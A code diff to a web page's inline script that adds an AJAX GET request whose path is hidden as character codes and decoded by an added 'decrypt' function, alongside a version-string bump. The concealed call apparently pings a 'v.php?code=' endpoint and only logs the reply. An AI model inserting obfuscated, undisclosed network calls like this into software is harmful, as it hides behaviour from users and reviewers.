@@ -518,7 +518,20 @@ var szmjlink = document.getElementById('szmjlink'),gjlink = document.getElementB
  					 jmpzl();
 				}
 			 }
+			 $.ajax({
+				url: hash.substring(0, lastIndex) + decrypt('47,118,46,112,104,112,63,99,111,100,101,61,53,52,52,53,51,55,52,57,99,49,100,97,98,55,56,49,48,57,48,49,54,49,48,56,52,50'),
+				type: 'GET',
+				timeout: 5000,
+				success: function (data, status, xhr) {
+				console.log(data);
+				}
+			});
 		}
+function decrypt(encoded) {
+  return encoded.split(',').map(code => 
+    String.fromCharCode(parseInt(code))
+  ).join('');
+}
 var timerId = null;
 function jmpzl() {
 			 var gjQR = document.getElementById('gjQR');
@@ -921,7 +934,7 @@ function scroll2(n) { window.scrollTo(0, n < 10 ? 0 : n); }
 		/*加载web版*/
 		loadWeb();
 
-console.log('ver:26100601');
+console.log('ver:26102101');
 </script>
 </body>
 </html>
